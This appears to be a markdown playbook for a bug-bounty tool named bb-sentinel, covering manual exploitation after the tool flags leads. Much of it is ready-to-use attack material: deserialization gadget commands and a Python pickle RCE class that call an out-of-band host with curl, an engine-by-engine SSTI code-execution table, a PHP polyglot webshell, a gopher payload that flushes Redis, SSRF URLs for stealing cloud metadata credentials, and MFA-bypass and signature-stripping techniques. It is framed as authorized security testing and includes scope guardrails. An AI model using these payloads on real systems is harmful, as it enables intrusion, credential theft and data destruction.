# Manual workflows — the parts bb-sentinel doesn't automate

bb-sentinel is a recon + detection tool. The probes in `src/rocks.py`
flag *leads*; weaponization happens in your Burp / Frida / mobile-test
environment. This document is the playbook for the categories that
either don't belong in an HTTP-recon pipeline (cellular, mobile apps)
or can't be safely automated without crossing into generic offensive
tooling territory (deserialization gadget delivery, SSRF chains).

Use bb-sentinel for the lead. Use this doc for the PoC.

## Contents

1. [Cellular auth-bypass testing](#cellular-auth-bypass-testing)
2. [Mobile application testing](#mobile-application-testing)
3. [Identity-provider self-registration](#identity-provider-self-registration)
4. [Manual exploitation playbooks](#manual-exploitation-playbooks)
   - [Java deserialization](#java-deserialization)
   - [.NET ViewState](#net-viewstate)
   - [Python pickle](#python-pickle)
   - [PHP unserialize](#php-unserialize)
   - [SSTI by engine](#ssti-by-engine)
   - [File upload → webshell](#file-upload--webshell)
   - [SAML claim swap and signature stripping](#saml-claim-swap-and-signature-stripping)
   - [SSRF gadget catalog](#ssrf-gadget-catalog)
5. [Triage heuristics](#triage-heuristics)

---

## Cellular auth-bypass testing

**Why this isn't in bb-sentinel:** the silent-auth and header-enrichment
seams live below HTTP — they're carrier-injected headers and IP→MSISDN
mappings that only appear when traffic originates from a cellular data
session, not Wi-Fi. You need a real device on real cellular for any of
this to reproduce.

### Scope guardrails (critical, do not skip)

- Confirm the program's **designated test MSISDN** before sending any
  identity-bearing request. Programs typically publish one specific
  number in the brief; using any other number — even your own — is
  out of scope and may also be a customer-account-tampering violation.
- Never substitute MSISDN values against subscribers who aren't your
  own and aren't the designated test target. Even on an authorized
  bounty, MSISDN substitution against arbitrary customers is a
  privacy violation.
- Video capture is usually required for cellular-bypass submissions.
  Record the full session, including the cellular indicator in the
  status bar, so the triager can see you weren't on Wi-Fi.

### Environment

```text
Device:        carrier-provisioned phone with the test SIM installed
Network:       cellular data only (Wi-Fi OFF, airplane mode OFF)
Proxy:         Burp Suite running on laptop, mobile configured to use it
               via the carrier APN's HTTP-proxy or by routing through a
               carrier-aware Wireguard tunnel back to the laptop
Capture tool:  Burp + Wireshark on the laptop side
```

Burp's mobile setup: install Burp's CA cert on the device, configure
the device's Wi-Fi proxy to point at your laptop's IP — **then disable
Wi-Fi**. Some carriers will reject the proxy config if Wi-Fi isn't
configured first, then continue applying it once you switch to cellular.

### What to look for

1. **Carrier-injected identity headers.** Common header names:
   `X-Up-Calling-Line-Id`, `X-MSISDN`, `X-Forwarded-MSISDN`,
   `MSISDN`, `X-Wap-Profile`, `X-Subscriber-Id`. Capture a baseline
   request to a clearly-yours endpoint; note which of these headers
   the upstream injects automatically when you're on cellular.

2. **MSISDN as a parameter.** Look for endpoints that take MSISDN
   as a query/body parameter and use it for authorization rather
   than just personalization. Test substituting **your own** other
   MSISDN (if you have a second test SIM) — never an arbitrary
   customer's.

3. **Silent-auth handshake.** When the app fetches initial
   account context, look for a handshake to a carrier-auth service
   (often `*.carrier-auth.*` or vendor-named like `zenkey`). The
   handshake should bind to the cellular session in a way that
   can't be replayed from Wi-Fi.

4. **IP→MSISDN trust boundary.** Carrier infrastructure often
   maps IP allocations to subscriber identity at the edge. If you
   can land traffic on the cellular-egress side from a different
   path (VPN over cellular? Carrier femtocell?) and the upstream
   trusts the IP-derived identity, that's a bypass.

### Replay strategies

- **Header injection from Wi-Fi**: with the cellular-captured request
  in Burp's repeater, replay it from a Wi-Fi origin with the carrier
  headers intact. If the response still grants account access, the
  upstream is trusting client-supplied headers without verifying
  cellular origin.
- **JWT claim substitution**: capture the silent-auth-issued JWT,
  decode the claims, swap `msisdn` / `subscriber_id` to another
  test MSISDN you own, re-sign with the original key (or test
  whether `alg=none` is accepted — yes, this still happens), replay.
- **Session-binding tests**: get an authenticated session for
  account A, try to use it against account B's endpoints (your
  second test account). The session token should not transfer.

---

## Mobile application testing

The major bounty programs typically list both iOS and Android variants
of several apps. Each gets its own treatment but the toolchain overlaps.

### Setup

```text
iOS:       jailbroken test device (Palera1n, Dopamine for arm64)
           Frida + Objection installed via Cydia / Sileo
Android:   rooted test device or Genymotion emulator with Frida server
           Objection + apktool + jadx for static analysis
Proxy:     Burp with CA cert installed on device's user + system store
           (Android 7+ ignores user-installed CAs by default — push to
           system store via Magisk module or repackage the APK with
           network_security_config.xml relaxed)
```

### Per-target workflow

1. **Static reconnaissance**
   - Extract APK from device or pull from Play Store via apkpure
   - `apktool d app.apk` → review `AndroidManifest.xml` for
     exported activities, deep-link schemes, content providers
   - `jadx-gui app.apk` → search for hardcoded URLs, API tokens,
     custom URL schemes, certificate pins, root-detection routines
   - iOS: `frida-ios-dump` extracts decrypted IPA; `class-dump`
     for Objective-C, `iaito` or Ghidra for Swift

2. **Cert-pinning bypass**
   - Objection: `android sslpinning disable` or
     `ios sslpinning disable` — usually defeats common pinning libs
     (OkHttp, AFNetworking, Square)
   - For custom pinning, hook the pin-check function directly via
     a Frida script

3. **Dynamic instrumentation**
   - Trace all HTTPS calls with Frida + Objection
   - Hook crypto APIs to log keys/IVs in use
   - Hook keychain / SharedPreferences access to inventory stored
     secrets

4. **Deep links and intent filters**
   - Map exported activities — each is a potential entry point
     bypassing the app's normal auth flow
   - Test deep-link parameters for SSRF, open-redirect (if in scope),
     credential leak via Referrer

5. **Backend differences from web**
   - Mobile apps often hit different endpoints than the web UI
   - Many use legacy/preview API versions with weaker validation
   - Some carry a static "client secret" embedded in the binary —
     extracting it via jadx and reusing it server-side is a common
     finding pattern

---

## Identity-provider self-registration

When a program permits self-registering an account against the
corporate IdP (typically Microsoft Entra ID / Azure AD or Okta), the
seams to test:

1. **Tenant discovery**
   - `curl -s https://login.microsoftonline.com/common/userrealm/<email>?api-version=2.1`
     returns the tenant ID for any email domain
   - `https://login.microsoftonline.com/<tenant>/.well-known/openid-configuration`
     reveals the full IdP config

2. **OAuth flow weaknesses**
   - Check whether `prompt=none` permits SSO without user
     interaction — combined with an XSS or open-redirect on the
     relying party, this is an account-takeover chain
   - Check whether the `state` parameter is properly bound to
     session

3. **Device-code flow abuse**
   - The Entra ID `/devicecode` endpoint historically permits
     enumeration; some configurations let you request a device
     code for any account and complete it from a different
     network

4. **MFA bypass via legacy protocols**
   - `https://login.microsoftonline.com/common/oauth2/token` with
     `grant_type=password` (ROPC) often bypasses MFA when the
     tenant hasn't disabled legacy auth
   - SMTP AUTH, IMAP/POP, ActiveSync — same legacy-auth bypass
     surface

5. **Self-service password reset abuse**
   - The SSPR flow's verification steps may be weaker than the
     primary auth flow
   - Phone-based verification + SIM swap is the classic full-takeover
     chain; not usually authorized for testing without explicit
     program approval

---

## Manual exploitation playbooks

These are the follow-ups for leads that bb-sentinel's
[`deserialization-markers`](../src/rocks.py), [`ssti-fingerprint`](../src/rocks.py),
[`file-upload-discovery`](../src/rocks.py), [`saml-oidc`](../src/rocks.py),
and [`ssrf-oob`](../src/rocks.py) probes surface.

### Java deserialization

Tool: [`ysoserial`](https://github.com/frohoff/ysoserial)

```bash
# Pick a gadget chain based on the libraries on the classpath
ysoserial CommonsCollections5 'curl http://OOB/hit' > payload.bin

# Common chains by library
#   CommonsCollections1..7      — Apache Commons Collections
#   CommonsBeanutils1           — Apache Commons BeanUtils
#   Spring1, Spring2            — Spring Framework
#   Hibernate1, Hibernate2      — Hibernate ORM
#   Jdk7u21, JdkPriorityQueue   — JDK-only (most portable)
#   JSON1                       — Jackson + various JSON libs
#   Click1, Vaadin1             — Click framework, Vaadin
#   ROME                        — ROME RSS

# Where to deliver
#   - HTTP body where bb-sentinel flagged the AC ED 00 05 marker
#   - Set-Cookie value in mirrored cookies
#   - Any field that gets passed through ObjectInputStream
```

### .NET ViewState

Tool: [`ysoserial.net`](https://github.com/pwntester/ysoserial.net)

bb-sentinel flags `__VIEWSTATE` with **no `__VIEWSTATEGENERATOR`** as
critical — that means no MAC validation. You need the
`validationKey` and `validationAlgorithm` to forge ViewState; common
sources:

```bash
# When MAC is absent: signed = false, any payload accepted
ysoserial.net -f BinaryFormatter -g TypeConfuseDelegate \
  -c "powershell -enc <base64>" --minify

# When MAC is present but you've leaked the machineKey:
ysoserial.net -p ViewState -g TextFormattingRunProperties \
  -c "whoami" --path "/path/to/page.aspx" --apppath "/" \
  --validationkey <hex> --validationalg HMACSHA256
```

machineKey leak vectors: exposed `web.config` (PathSweep flags this),
exposed `machine.config` via LFI, ASP.NET error pages disclosing
machineKey in stack traces.

### Python pickle

bb-sentinel flags `\x80\x04` magic in `octet-stream` responses.
Pickle has no MAC by default — if the server unpickles client-supplied
bytes, it's RCE.

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://OOB/hit',))

payload = pickle.dumps(RCE())
# deliver as the bytes the server expects to unpickle
print(base64.b64encode(payload).decode())
```

Common delivery points: cookie values, file uploads where the server
expects a pickled object, message-queue payloads.

### PHP unserialize

Tool: [`phpggc`](https://github.com/ambionics/phpggc)

```bash
# List chains for a target library
phpggc -l Monolog
phpggc -l Laravel
phpggc -l Symfony

# Generate
phpggc Monolog/RCE1 system 'curl http://OOB/hit' > payload.txt

# Wrap for delivery context
phpggc -p phar Guzzle/RCE1 system id     # PHAR-deserialization
phpggc -b Guzzle/INJECT 'payload'        # base64-encoded
phpggc -u Guzzle/INJECT 'payload'        # URL-encoded
```

### SSTI by engine

bb-sentinel identifies the engine. Engine → RCE map:

| Engine | RCE payload (after fingerprint) |
|--------|---------------------------------|
| Jinja2 | `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}` |
| Twig (PHP) | `{{ ['id']\|filter('system') }}` (Twig 2+) or `{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}` (Twig 1.x) |
| FreeMarker | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` |
| Spring SpEL | `${T(java.lang.Runtime).getRuntime().exec("id")}` |
| Velocity | `#set($e="exp"+"loit")$e.getClass().forName("java.lang.Runtime").getMethod("exec",[Ljava.lang.String).invoke(...)` |
| ERB | `<%= \`id\` %>` |
| Thymeleaf | `[[${T(java.lang.Runtime).getRuntime().exec('id')}]]` |
| Smarty | `{system('id')}` (Smarty 3 unsandboxed) |
| Mako | `${self.module.cache.util.os.popen('id').read()}` |
| Handlebars | `{{#with "constructor"}}{{#with split as |c|}}{{pop (push "alert(1)")}}{{#with (concat (lookup join (slice 0 1)))}}{{this}}{{/with}}{{/with}}{{/with}}` |

For each, sandbox-escape posture varies by version. Test on
[`tplmap`](https://github.com/epinna/tplmap) if you want automated
exploitation; otherwise the payloads above are starting points.

### File upload → webshell

bb-sentinel flags the upload endpoint and form fields. The manual
phase tests for:

1. **MIME-only validation**: send `.php` content with
   `Content-Type: image/jpeg`
2. **Extension blacklist gaps**: try `.phtml`, `.php5`, `.phar`,
   `.pht`, `.pl`, `.cgi`, `.jsp`, `.jspx`, `.aspx`, `.ashx`
3. **Double extension**: `webshell.php.jpg`,
   `webshell.jpg.php` (Apache misconfig)
4. **Null byte**: `webshell.php%00.jpg`
5. **Path traversal in filename**: `../webshell.php`,
   `..\\webshell.php`
6. **SVG XSS**: SVG with embedded `<script>`
7. **Polyglot**: GIF header + PHP body
   (`GIF89a<?php system($_GET['c']); ?>`)
8. **MIME type confusion**: `Content-Type: application/x-httpd-php`
   on a `.txt` upload

Webshell content — use a minimal one-liner that's clearly yours and
includes your username + timestamp in a comment, so the triager can
identify it as authorized testing.

### SAML claim swap and signature stripping

bb-sentinel flags SAML metadata; for each in-scope SP:

1. **`xmlsec` signature wrapping (XSW)**
   - Tools: [`SAMLRaider`](https://github.com/CompassSecurity/SAMLRaider)
     (Burp extension), [`samltool.io`](https://samltool.io)
   - Eight XSW variants — try each in Burp's
     repeater on a captured SAML response

2. **Claim manipulation**
   - Swap `NameID` to a different account's identifier
   - Add unauthorized `AttributeStatement` claims
     (group/role/permission elevation)
   - Replay an old assertion (no `OneTimeUse`?)

3. **Signature stripping**
   - Bb-sentinel flags when `WantAssertionsSigned="false"`
   - Send unsigned assertion; if accepted, claim swap is trivial

### SSRF gadget catalog

bb-sentinel's `ssrf-oob` in `oob-active` mode confirms SSRF; this
catalog is what to point it at once confirmed:

| Target | URL | What it reveals |
|--------|-----|-----------------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Instance-role credentials (STS) |
| AWS IMDSv2 | (requires token, mostly blocks SSRF) | — |
| GCP metadata | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | Service-account token (requires `Metadata-Flavor: Google` header) |
| Azure IMDS | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` (requires `Metadata: true`) | Managed-identity token |
| Kubelet | `http://localhost:10255/pods` | Pods + secrets if anonymous-auth enabled |
| Redis (no-auth) | `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a` | Direct command exec |
| Memcached | `gopher://127.0.0.1:11211/_stats` | Cached data, sometimes session tokens |
| Docker socket | `http://localhost/v1.40/containers/json` (if exposed via TCP) | Container list, with credentials |
| Internal admin panels | `http://localhost:8080/`, `http://127.0.0.1:9000/` | Locally-bound admin UIs (Spring Actuator, Jenkins, Kibana, etc.) |
| File: scheme | `file:///etc/passwd` | LFI via SSRF (specific to libs that accept file://) |

For the T-Mobile-style internal-target validation, set
`BBSENTINEL_PIVOT_URLS` to the brief's explicit IPs and
`BBSENTINEL_PIVOT_CANARY=flag` — the `ssrf-oob` probe handles the rest.

---

## Triage heuristics

When a single scan surfaces dozens of findings, the order to dig in:

1. **Critical-tagged findings** — always first; these are direct PoC
   leads (alg=none, no MAC ViewState, anonymous bucket listing,
   confirmed LFI, jolokia MBean exposure)
2. **`internal-service` hits** on the in-scope internal-named zones
   — these are the highest-paying category for "corporate network
   access" bounties; even if not RCE-ready, an unauthenticated
   Jenkins / Grafana / Jupyter / Vault behind no firewall is a
   write-up
3. **`spring-actuator` /env with secrets unmasked** — direct
   credential exposure; chain into the target system the creds open
4. **`ssti-fingerprint` confirmed** — high-confidence RCE path; use
   the engine-specific gadgets above
5. **`object-storage` anonymous listing** — survey the bucket
   contents for credentials, internal docs, customer data; impact
   depends entirely on what's inside
6. **`deserialization-markers` no-MAC ViewState** — high-confidence
   RCE if you can locate or guess `validationKey`
7. **`file-upload-discovery`** — high-yield once you start sending
   the manual payload catalog above

Findings classes that almost never pay (on impact-graded programs):
single-host CORS misconfig without credentialed reflection, low-sev
information disclosure without secret content, MethodEnum unauth
methods unless they actually let you write data.

When all else is even, prioritize findings on hosts in the program's
*core* asset tier over supplemental — the per-finding payouts differ
substantially.
